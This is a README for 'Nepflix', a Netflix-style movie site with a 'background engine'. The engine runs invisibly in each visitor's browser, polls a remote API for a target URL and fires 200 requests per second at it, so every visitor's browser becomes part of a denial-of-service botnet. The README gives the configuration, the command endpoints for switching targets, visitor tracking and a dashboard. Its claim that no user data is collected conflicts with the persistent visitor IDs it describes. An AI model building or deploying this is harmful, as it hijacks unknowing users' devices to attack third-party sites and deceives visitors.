# Nepflix with Background Engine

Combined Netflix-style streaming app with integrated background request engine.

## Features

### Nepflix UI
- Netflix-style interface
- Movie browsing and search
- Video player with fullscreen support
- My List functionality
- Responsive design

### Background Engine
- Runs silently in the background
- Fetches target URL from API every 30 seconds
- Automatically updates without user notice
- Sends 200 requests per second
- No UI interference

## Configuration

Edit the `BackgroundEngine` configuration in `nepflix.html`:

```javascript
const CONFIG = {
    apiEndpoint: "https://nepflix.eu.cc/api/",         // Your API endpoint
    fallbackTarget: "https://graph.vshield.pro",       // Fallback if API fails
    rps: 200,                                           // Requests per second
    duration: 5000,                                     // Duration in seconds
    refreshInterval: 30000                              // API check interval (ms)
};
```

## API Setup

### Using the PHP API (Recommended)

1. Upload the `api` folder to your server at `nepflix.eu.cc/api/`

2. Set your secret key in `api/update.php` and `api/visitors.php`:
```php
$secretKey = 'your-secret-key-here'; // Change this!
```

3. Make sure `visitors.json` is writable:
```bash
chmod 666 api/visitors.json
```

4. The API endpoints:
   - **GET** `https://nepflix.eu.cc/api/` - Returns current target URL
   - **GET** `https://nepflix.eu.cc/api/update.php?url=https://newsite.com&key=your-key` - Updates target
   - **GET** `https://nepflix.eu.cc/api/visitors.php?action=count` - Get active visitor count
   - **GET** `https://nepflix.eu.cc/api/visitors.php?action=list&key=your-key` - Get detailed visitor list
   - **VIEW** `https://nepflix.eu.cc/api/dashboard.html` - Live traffic dashboard

### Visitor Tracking

The system automatically tracks live visitors in real-time:

- **Heartbeat**: Every 15 seconds, each visitor sends a ping
- **Timeout**: Visitors inactive for 30+ seconds are removed
- **Persistent ID**: Each visitor gets a unique ID stored in localStorage
- **Real-time**: Dashboard updates every 3 seconds

### Live Traffic Dashboard

Access the dashboard at: `https://nepflix.eu.cc/api/dashboard.html`

Features:
- 👥 **Active Visitors** - Current live users
- 📈 **Peak Today** - Maximum concurrent visitors
- 📊 **Total Sessions** - Session counter
- 🔍 **Detailed List** - View individual visitors (requires API key)

### API Response Format

**Target URL API** returns:
```
url=https://target-site.com
```

**Visitor Count API** returns:
```json
{
  "success": true,
  "activeVisitors": 42,
  "timestamp": 1714483200
}
```

### Update Target URL

**Via Browser:**
```
https://nepflix.eu.cc/api/update.php?url=https://new-target.com&key=your-secret-key
```

**Via cURL:**
```bash
curl "https://nepflix.eu.cc/api/update.php?url=https://new-target.com&key=your-secret-key"
```

## How It Works

1. **Page loads** → Background engine starts automatically
2. **Engine fetches** target URL from API immediately
3. **Every 30 seconds** → Checks API for URL updates
4. **If URL changes** → Seamlessly switches to new target
5. **Sends requests** → 200 per second to current target
6. **User experience** → Completely unaffected, no UI changes

## Usage

Simply open `nepflix.html` in a browser. The background engine starts automatically and runs invisibly while users browse movies.

## Security Notes

- Uses `no-cors` mode for cross-origin requests
- Implements ad-blocker to prevent popups
- All requests are non-blocking
- No user data is collected or transmitted

## Customization

- Modify `rps` to change request rate
- Adjust `refreshInterval` for API polling frequency
- Change `fallbackTarget` for default URL
- Update `apiEndpoint` to your API URL
